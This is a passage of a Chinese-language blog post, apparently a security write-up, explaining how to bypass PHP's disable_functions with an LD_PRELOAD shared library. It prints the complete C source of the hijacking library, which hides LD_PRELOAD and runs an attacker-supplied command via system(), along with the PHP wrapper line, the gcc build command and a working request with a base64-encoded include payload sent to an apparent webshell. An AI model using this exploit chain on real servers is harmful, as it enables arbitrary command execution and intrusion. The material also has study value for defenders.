+<li>outpath参数：保存命令执行输出结果的文件路径(如&#x2F;tmp&#x2F;xx)，便于在页面上显示，另外该参数，你应注意web是否有读写权限、web是否可跨目录访问、文件将覆盖和删除几点。</li>
+<li>sopath参数：指定劫持系统函数的共享对象的绝对路径(如&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so),另外关于该参数，应注意web是否可跨目录访问到它。</li>
+</ul>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$evil</span>_cmdline = <span class="hljs-symbol">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-symbol">$out</span>_path . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>eval_cmdline 拼接了cmd和outpath参数，使得命令的输出被重定向到指定的文件$out_path中</li>
+<li>2&gt;&amp;1 将标准错误重定向到标准输出，因此$out_path中会同时包含标准输出和标准错误信息。<br><strong>实例</strong><br>假设 cmd&#x3D;pwd，outpath&#x3D;&#x2F;tmp&#x2F;xx，则 evil_cmdline 将是 pwd &gt; &#x2F;tmp&#x2F;xx 2&gt;&amp;1，可以将当前目录路径写入 &#x2F;tmp&#x2F;xx 文件。<br>然后下面是设置环境变量，以配合下面的bypass_disablefunc.c</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">echo &quot;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>output<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>: <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>&quot; . nl2br(file_get_contents($out_path)) . &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&quot;; <br></code></pre></td></tr></table></figure>
+<p>读取我们打印我们命令结果的文件，并输出到页面上</p>
+<p>再来分析bypass_disablefunc.c</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// get command line options and arg</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* cmdline = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;EVIL_CMDLINE&quot;</span>);<br><br>    <span class="hljs-comment">// unset environment variable LD_PRELOAD.</span><br>    <span class="hljs-comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br>    <span class="hljs-comment">// distribution (e.g., centos), I need crafty trick.</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// executive command</span><br>    <span class="hljs-built_in">system</span>(cmdline);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>详细代码解读</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">const char* cmdline <span class="hljs-operator">=</span> getenv(<span class="hljs-string">&quot;EVIL_CMDLINE&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>getenv(“EVIL_CMDLINE”) 从环境变量中获取名为EVIL_CMDLINE的值，并将其存储在指针cmdline中。如果EVIL_CMDLINE已被设置，cmdline将指向其中包含的命令字符串。</p>
+</li>
+<li><p>EVIL_CMDLINE环境变量可有攻击者在运行此共享库的进程之前预先设置，从而通过该变量传递任意命令。</p>
+</li>
+</ul>
+<p>EVIL_CMDLINE正是由上面的php写入的</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog">int i;<br>for (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>    if (strstr(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>        environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>environ 是一个全局变量的数组，包含所有环境变量的指针。在大多数Linux系统上，environ会自动包含进程的所有环境变量</li>
+<li>该循环遍历environ数组中的每一个字符串，检查是否包含”LD_PRELOAD”。</li>
+<li>strstr(environ[i], “LD_PRELOAD”) 用于在每一个环境变量中查找是否包含LD_PRELOAD。如果找到，执行environ[i][0]&#x3D;’\0’;将该字符串的首字符设为\0(空字符)，从而清空这一环境变量。</li>
+<li>这样做的目的是隐藏LD_PRELOAD变量，因为某些系统或程序可能会检测此环境变量的存在，将其移除后可以避免被发现。</li>
+</ul>
+<p>然后system执行cmdline命令</p>
+<ul>
+<li>system是标准C库函数，用于执行命令。他会创建一个新的shell来执行cmdline中的内容。</li>
+<li>由于这里的cmdline是从环境变量EVIL_CMDLINE中获取的，攻击者可以通过设置EVIL_CMDLINE环境变量，在目标进程加载共享库是执行任意命令。</li>
+<li>这个命令的执行权限与运行此共享库的进程相同，意味着如果目标进程是以管理员权限运行的，这个命令也将以管理员权限执行，带来潜在的严重风险。</li>
+</ul>
+<p>刚开始分析的时候还傻傻的反编译.so文件，so文件就是由上面的bypass_disalbefunc.c编译生成的<br>生成命令</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">gcc <span class="hljs-keyword">bypass_disablefunc.c </span>-fpic -<span class="hljs-keyword">shared </span>-o <span class="hljs-keyword">bypass_disablefunc.so</span><br></code></pre></td></tr></table></figure>
+<ul>
+<li>-fPIC：生成与位置无关的代码，这是创建共享库所需的。</li>
+<li>-shared：指示编译器生成一个共享库。</li>
+<li>-o xx：指定输出文件名为 xx。<br><img src="/images/F92BA171306D421d98E77916CDB8E282.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<p>接下来就是操作了<br>首先，想办法将bypass_disablefunc.php和bypass_disablefunc.so传到有权限的目录中。<br><img src="/images/0BF7522275F741829AC90DB0A18A60C9.png" srcset="/img/loading.gif" lazyload><br>然后将bypass_disalbefunc.php包含进来并使用GET方法提供所需的三个参数</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?G<span class="hljs-attr">inkgo</span><span class="hljs-operator">=</span>aW5jbHVkZSgiL3Zhci90bXAvYnlwYXNzX2Rpc2FibGVmdW5jLnBocCIpOw==<span class="hljs-variable">&amp;cmd</span>=id<span class="hljs-variable">&amp;outpath</span>=<span class="hljs-keyword">/tmp/</span>outfile123<span class="hljs-variable">&amp;sopath</span>=<span class="hljs-keyword">/var/</span>tmp/bypass_disablefunc.so<br></code></pre></td></tr></table></figure>
+<p><img src="/images/8EF3B810658047e5AB52E2B511DC6993.png" srcset="/img/loading.gif" lazyload><br>如图所示，成功执行命令</p>
+<p>蚁剑有该绕过disable_functions的插件<br><img src="/images/AEEC7AAF6C014f01B805FCE1B83B4C5C.png" srcset="/img/loading.gif" lazyload><br><img src="/images/1A47A6C3B0D045429D7A6641C757FBD1.png" srcset="/img/loading.gif" lazyload><br>可以看见我们植入的恶意环境变量，但是在蚁剑中却看不到，因为语句结束后已经删除了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>绕过disable_function</div>
+      <div>http://example.com/2024/11/14/disable_function_bypass/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/11/ISCTF2024/" title="ISCTF2024">
+                        <span class="hidden-mobile">ISCTF2024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
